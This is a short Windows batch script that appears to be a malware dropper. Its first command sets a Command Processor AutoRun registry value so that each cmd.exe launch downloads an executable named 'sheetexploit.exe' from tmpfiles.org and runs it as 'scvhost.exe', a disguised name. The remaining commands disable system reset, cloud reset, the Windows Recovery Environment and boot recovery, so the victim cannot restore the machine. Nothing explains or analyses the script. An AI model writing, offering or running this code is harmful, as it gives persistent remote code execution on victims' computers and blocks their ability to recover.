@echo off
reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "powershell -Command \"Invoke-WebRequest -Uri 'http://tmpfiles.org/dl/2623529/sheetexploit.exe' -OutFile $env:TEMP\scvhost.exe; Start-Process $env:TEMP\scvhost.exe\"" /f


REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableResetToDefault /t REG_DWORD /d 1 /f

REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v AllowResetProvisioning /t REG_DWORD /d 0 /f

REG ADD "HKLM\SOFTWARE\Microsoft\RecoveryPlatform" /v EnableCloudReset /t REG_DWORD /d 0 /f

reagentc /disable

bcdedit /set {current} recoveryenabled No




exit
